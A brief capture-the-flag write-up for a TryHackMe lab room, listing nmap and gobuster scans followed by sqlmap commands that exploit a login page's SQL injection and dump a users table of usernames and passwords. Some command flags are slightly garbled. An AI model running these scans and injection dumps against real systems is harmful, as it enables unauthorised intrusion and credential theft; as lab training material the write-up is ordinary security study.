## **Cod Caper**

### Task-4

[https://tryhackme.com/room/thecodcaper](https://tryhackme.com/room/thecodcaper)

```
nmap -sC -sV –script=vuln -vv <IP>
```

They gave us a file big.txt for it

```
gobuster dir -u http://<IP> -w big.txt -x .php, .html, .txt
```

Now here we found administrator.php so we will run an sqlmap in this

Capture its post request via Burp suite

Save the request in a txt file req.txt

```
sqlmap -r req.txt -D users --tables
```

Now we found that there is a table users

```
sqlmap -r req.txt -D users --T users --dump
```

We found username and password

**Only Task 4 for Web exploitation**

### **2nd Method**

```
sqlmap -u http://10.10.186.52/administrator.php --dbs --forms
```

```
sqlmap -u http://10.10.186.52/administrator.php -D users --tables
```

we found a db list

```
sqlmap -u http://10.10.186.52/administrator.php -D users -T users –dump-all
```
